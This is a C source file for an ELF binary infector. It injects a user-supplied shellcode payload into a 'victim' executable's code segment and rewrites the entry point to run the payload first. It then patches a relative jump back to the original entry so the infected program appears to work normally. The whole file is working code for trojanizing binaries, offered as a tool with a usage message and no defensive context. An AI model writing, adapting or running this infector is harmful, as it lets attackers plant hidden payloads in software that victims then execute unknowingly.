#include<stdio.h>
#include<stdlib.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<string.h>
#include<elf.h>


typedef struct ELF_FORMAT{
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    Elf64_Shdr *shdr;
}elf_format;



#define Ehdr Elf64_Ehdr
#define Shdr Elf64_Shdr
#define Phdr Elf64_Phdr



int space = 0;

char *inject(char *f_buf, char *shellcode, int f_len,int sc_len){
    
    Ehdr *ehdr = (Ehdr*)f_buf;
    Phdr *phdr = (Phdr*)(f_buf+(int)ehdr->e_phoff);
    Shdr *shdr = (Shdr*)(f_buf+(int)ehdr->e_shoff);

    space = 0x2000;
    
    char sh_code[] = "\xe9KKKK\0";
                    
    int sh_code_l = strlen(sh_code);
    
    
    int x_offset=0,x_size=0;
    u_int64_t new_entry_offs = 0;
    u_int64_t old_entry_offs = 0;
    size_t vaddr_base = 0;
    for( int ind=0; ind < ehdr->e_phnum ; ind++ ){

        Phdr *p = &phdr[ind];
        printf("Plarogram header %d, flag=%d\n",ind,p->p_flags);
        if(p->p_flags==(PF_X|PF_R)){
            x_offset = p->p_offset;
            x_size = p->p_filesz;
            vaddr_base = p->p_vaddr-p->p_offset;
        
            new_entry_offs = p->p_filesz+p->p_offset;
            p->p_memsz += sc_len+sh_code_l;
            p->p_filesz += sc_len+sh_code_l;
            break;
        }
    }
    
    for( int ind=0 ; ind<ehdr->e_phnum ; ind++ ){

        Phdr *p = &phdr[ind];
        
        if(p->p_offset>x_offset+x_size){
            p->p_offset+=space;

        }
    }
    for( int ind=0; ind<ehdr->e_shnum; ind++ ){
        Shdr *s = &shdr[ind];
        
        if(s->sh_offset>x_offset+x_size){
            s->sh_offset += space;

        }
        else if(s->sh_offset+s->sh_size==x_offset+x_size){
            s->sh_size += sc_len+sh_code_l;
        }
    }


    old_entry_offs = ehdr->e_entry - vaddr_base;
    ehdr->e_entry = new_entry_offs+vaddr_base;
    ehdr->e_shoff += space;
    int64_t j_back_offs = old_entry_offs - (new_entry_offs + sc_len + sh_code_l);
    /*printf("old_entry_offs: 0x%x , new_entry_offs: 0x%x , sh_len: 0x%x \n"*/
            /*"j_back_offs: 0x%x \n\n",*/
            /*old_entry_offs,new_entry_offs,sc_len+sh_code_l,j_back_offs);*/
    memcpy(sh_code+1,(char*)&j_back_offs,4);

    char * infect_buf = malloc(sizeof(char)*(f_len+space));
    /*printf("infect_buf: 0x%08x , f_buf: 0x%08x , x_offs = %d, x_size: %d",*/
            /*infect_buf,f_buf,x_offset,x_size);*/
    memcpy(infect_buf,f_buf,x_offset+x_size);
    memcpy(infect_buf+x_offset+x_size , shellcode , sc_len );
    memcpy(infect_buf+x_offset+x_size+sc_len, sh_code, sh_code_l);
    memcpy(infect_buf+x_offset+x_size+space, f_buf+x_offset+x_size, f_len-(x_offset+x_size));
    return infect_buf;



}



int main(int argc,char **argv){
    if(argc<4){
        printf("Please give enough argv. For example: \n"

                "./inject \'path_to_victim_binary\' \'path_to_ur_payload\' \'path_to_ur_output\'\n");
        exit(1);
    }
    FILE *data = fopen(argv[1],"rb");
    FILE *shell = fopen(argv[2],"rb");

    struct stat filestat;
    int sh_size,data_size;

    if(fstat(fileno(data),&filestat)){
        perror("fuck");
        exit(1);
    }
    data_size = filestat.st_size;

    if(fstat(fileno(shell),&filestat)){
        perror("fuck");
        exit(1);
    }
    sh_size = filestat.st_size;

    char* data_buf = (char*)malloc(sizeof(char)*data_size);
    char* sh_buf = (char*)malloc(sizeof(char)*sh_size);

    fread(data_buf,1,data_size,data);
    fread(sh_buf,1,sh_size,shell);

    char* inj = inject(data_buf,sh_buf,data_size,sh_size);
    fclose(data);
    fclose(shell);
    free(data_buf);
    free(sh_buf);
    FILE *out_f = fopen(argv[3],"wb");

    fwrite(inj,1,data_size+space,out_f);

    printf("success\n");
    return 0;
}

